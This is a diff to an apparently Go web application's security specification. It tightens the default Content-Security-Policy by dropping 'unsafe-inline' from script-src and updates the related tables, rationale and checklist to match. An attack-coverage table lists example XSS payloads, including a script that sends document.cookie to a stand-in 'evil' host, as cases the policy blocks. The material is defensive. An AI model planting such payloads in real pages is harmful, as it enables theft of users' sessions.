@@ -13552,8 +13552,8 @@ When `DEBUG=true` is active and an error occurs, the canonical error body (PART 
     "line": 42,
     "column": 7,
     "sample": "doSomething(",
-    "matched_policy": "script-src 'self' 'unsafe-inline'",
-    "why_blocked": "inline event handler — 'unsafe-inline' applies only to <script> blocks, not on=\"...\" attributes",
+    "matched_policy": "script-src 'self'",
+    "why_blocked": "inline event handler — script-src 'self' allows no inline script of any kind (no 'unsafe-inline')",
     "fix_hint": "move the handler to an addEventListener() call in app.js"
   }
 }
@@ -13570,7 +13570,7 @@ When `DEBUG=true` is active and an error occurs, the canonical error body (PART 
 | Threat | Layer 1 (input) | Layer 2 (data access) | Layer 3 (output) | Layer 4 (transport) |
 |--------|-----------------|------------------------|-------------------|----------------------|
 | SQL injection | Strict input validation by type/format | Parameterized queries ONLY — never `fmt.Sprintf` SQL with user input | ORM/query-builder layer rejects suspicious patterns | Database user has minimum privileges (no DROP, no DDL in app role) |
-| XSS | Reject control chars / null bytes at input | n/a | HTML-escape on render (templates auto-escape; raw output requires explicit `template.HTML` cast and review) | CSP `'self' + 'unsafe-inline'` blocks cross-origin script loads (PART 11 → CSP) |
+| XSS | Reject control chars / null bytes at input | n/a | HTML-escape on render (templates auto-escape; raw output requires explicit `template.HTML` cast and review) | CSP script-src `'self'` blocks injected scripts — inline and cross-origin (PART 11 → CSP) |
 | Enumeration (account existence, valid IDs, valid tokens) | Rate limit per IP + per identifier + global | Constant-time comparison for tokens / passwords | Identical response shape and timing for "not found" vs "no access" | n/a |
 | Timing oracles | n/a | `subtle.ConstantTimeCompare` for all secret comparisons | Identical response time for success/fail by adding artificial sleep when faster than threshold | n/a |
 | Credential stuffing | Rate limit per IP + per token-prefix + global | Constant-time SHA-256 comparison (no "fast path" for invalid prefixes) | Generic "invalid token" message | Token auto-revoked after N consecutive failures |
@@ -13997,7 +13997,7 @@ Server-Timing: db;dur=12.4, render;dur=3.1, total;dur=18.7
 
 ```
 default-src 'self';
-script-src 'self' 'unsafe-inline';
+script-src 'self';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: blob: https:;
 font-src 'self' https:;
@@ -14020,7 +14020,7 @@ report-uri /api/{api_version}/server/reports/csp
 | Directive | Default | Reason |
 |-----------|---------|--------|
 | `default-src` | `'self'` | Strict baseline; all unset directives fall back here. |
-| `script-src` | `'self' 'unsafe-inline'` | `'unsafe-inline'` is the pragmatic compromise — most templates inline small scripts (analytics opt-in, theme bootstrap). Tighten with nonces if your app generates them; see "Tightening to nonce-based CSP" below. |
+| `script-src` | `'self'` | All JS lives in `static/js/app.js` — no inline scripts, no inline handlers — so `'self'` costs nothing and blocks every injected `<script>`, inline or cross-origin. |
 | `style-src` | `'self' 'unsafe-inline'` | Inline `style=""` attributes and `<style>` blocks are unavoidable in many templates and component frameworks. |
 | `img-src` | `'self' data: blob: https:` | `data:` for inline icons/SVG, `blob:` for client-side generated previews, `https:` so user avatars / CDN images / OG embeds work without per-host config. (HTTP images explicitly excluded — TLS only.) |
 | `font-src` | `'self' https:` | Web fonts (Google Fonts, FontAwesome CDN, custom CDNs) work without per-host config. HTTPS only. |
@@ -14100,7 +14100,7 @@ Server-side handling:
 
 ### Tightening to nonce-based CSP
 
-For deployments that can generate per-request nonces (most Go template setups can), drop `'unsafe-inline'` from `script-src`/`style-src` and use:
+For deployments that can generate per-request nonces (most Go template setups can), drop `'unsafe-inline'` from `style-src` too (`script-src` already ships without it) and use:
 
 ```yaml
 web:
@@ -14116,7 +14116,7 @@ The middleware substitutes `{request_nonce}` per response and adds the same nonc
 | Attack | Default policy stops it? |
 |--------|--------------------------|
 | Stored XSS injecting `<script src="https://evil.example/...">` | ✓ Yes (script-src `'self'` blocks the cross-origin load) |
-| Stored XSS injecting `<script>fetch('//evil/?'+document.cookie)</script>` | ✗ No with default (`'unsafe-inline'`); ✓ Yes with nonce-based override |
+| Stored XSS injecting `<script>fetch('//evil/?'+document.cookie)</script>` | ✓ Yes (script-src `'self'` has no `'unsafe-inline'` — all inline scripts are blocked) |
 | Clickjacking via `<iframe src="https://victim/...">` | ✓ Yes (frame-ancestors `'self'`) |
 | `<base href="https://evil/">` redirecting all relative URLs | ✓ Yes (base-uri `'self'`) |
 | Form-action hijack to `https://evil/login` | ✓ Yes (form-action `'self'`) |
@@ -44201,7 +44201,7 @@ make docker
 
 ### Security Headers
 
-- [ ] Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
+- [ ] Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
 - [ ] X-Frame-Options: SAMEORIGIN
 - [ ] X-Content-Type-Options: nosniff
 - [ ] X-XSS-Protection: 1; mode=block
